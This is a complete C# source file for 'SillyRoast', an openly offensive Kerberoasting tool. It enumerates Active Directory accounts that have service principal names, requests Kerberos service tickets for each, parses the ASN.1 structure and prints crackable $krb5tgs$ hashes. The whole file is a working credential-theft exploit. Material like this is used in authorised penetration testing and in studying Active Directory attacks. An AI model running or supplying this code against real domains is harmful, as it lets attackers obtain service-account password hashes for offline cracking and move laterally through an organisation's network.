using System;
using System.Collections.Generic;
using System.DirectoryServices;
using System.DirectoryServices.ActiveDirectory;
using Asn1;


namespace SillyRoast
{
    internal class Program
    {

        static string GetCurrentDomainPath()
        {
            DirectoryEntry de = new DirectoryEntry("LDAP://RootDSE");

            return "LDAP://" + de.Properties["defaultNamingContext"][0].ToString();
        }

        static string[] Query(string query)
        {
            SearchResultCollection results;
            DirectorySearcher ds = null;

            DirectoryEntry de = new DirectoryEntry(GetCurrentDomainPath());
            de.AuthenticationType = AuthenticationTypes.Secure;
            ds = new DirectorySearcher(de);
            ds.Filter = query;

            Console.WriteLine("[+] Finding Kerberoastable accounts...");
            results = ds.FindAll();

            var spns = new List<string>();
            if(results.Count == 0)
            {
                Console.WriteLine("[-] No Kerberoastable accounts found :(");
                System.Environment.Exit(0);
            }
            foreach (SearchResult sr in results)
            {
                spns.Add(sr.Properties["name"][0].ToString());
            }

            return spns.ToArray();
        }

        static bool Kerberoast(string[] args)
        {

            string domain = Domain.GetComputerDomain().ToString();
            string spnFilter = "(&(&(servicePrincipalName=*)(!samAccountName=krbtgt))(!useraccountcontrol:1.2.840.113556.1.4.803:=2)(samAccountType=805306368))";
            string[] spns = Query(spnFilter);

            System.IdentityModel.Tokens.KerberosRequestorSecurityToken ticket;
            for (int i = 0; i < spns.Length; i++)
            {

                long encType = 0;
                string spn = spns[i] + "@" + domain;
                
                ticket = new System.IdentityModel.Tokens.KerberosRequestorSecurityToken(spn);
                Console.WriteLine("[+] Requesting ticket...");
                byte[] requestBytes = ticket.GetRequest();

                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);

                Console.WriteLine("[+] Decoding...");
                AsnElt apRep = AsnElt.Decode(apReqBytes);
                foreach (AsnElt elem in apRep.Sub[0].Sub)
                {
                    if (elem.TagValue == 3)
                    {
                        foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                        {
                            if (elem2.TagValue == 3)
                            {
                                foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                {
                                    if (elem3.TagValue == 0)
                                    {
                                        encType = elem3.Sub[0].GetInteger();
                                    }

                                    if (elem3.TagValue == 2)
                                    {
                                        byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                        string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
                                        string hash = "";

                                        if ((encType == 18) || (encType == 17))
                                        {
                                           
                                            int checksumStart = cipherText.Length - 24;
                                           
                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
                                        }
                                       
                                        else
                                        {
                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, spns[i], Domain.GetComputerDomain().ToString(), spn, cipherText.Substring(0, 32), cipherText.Substring(32));
                                        }

                                        Console.WriteLine("[+] Got Hash!\n" + hash);
                                    }
                                }
                            }
                        }
                    }

                }
            }

            return true;
        }

        static void Main(string[] args)
        {
            Console.WriteLine("\r\n\r\n███████╗██╗██╗     ██╗  ██╗   ██╗██████╗  ██████╗  █████╗ ███████╗████████╗\r\n██╔════╝██║██║     ██║  ╚██╗ ██╔╝██╔══██╗██╔═══██╗██╔══██╗██╔════╝╚══██╔══╝\r\n███████╗██║██║     ██║   ╚████╔╝ ██████╔╝██║   ██║███████║███████╗   ██║   \r\n╚════██║██║██║     ██║    ╚██╔╝  ██╔══██╗██║   ██║██╔══██║╚════██║   ██║   \r\n███████║██║███████╗███████╗██║   ██║  ██║╚██████╔╝██║  ██║███████║   ██║   \r\n╚══════╝╚═╝╚══════╝╚══════╝╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝ ");
            Console.WriteLine("Kerberoast in a very silly way\n");

            try
            {
                bool didgood = Kerberoast(args);
                if (didgood)
                {
                    Console.WriteLine("[+] SillyRoast completed...");
                }
            
            }
            catch (Exception ex)
            {
                Console.WriteLine("[-] Exception: " + ex.Message);
            }
            



        }
    }
}
